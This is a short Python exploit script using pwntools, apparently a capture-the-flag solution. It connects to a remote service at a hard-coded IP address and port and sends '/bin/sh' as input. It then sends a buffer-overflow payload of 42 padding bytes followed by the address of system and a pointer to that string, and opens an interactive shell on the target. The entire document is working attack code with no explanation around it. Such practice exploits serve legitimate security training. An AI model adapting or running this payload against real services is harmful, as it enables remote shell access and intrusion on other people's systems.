from pwn import *
context.log_level = 'debug'

p="./elf"

context.binary=p
#io=process(p)
io=remote("111.198.29.45",57371)
sys_plt=0x8048420
binsh=0x0804A080

payload="a"*42+p32(sys_plt)+p32(0xdeadbeef)+p32(binsh)
io.recvuntil("name")
io.sendline("/bin/sh\x00")
io.recvuntil("here:")
io.sendline(payload)

io.interactive()
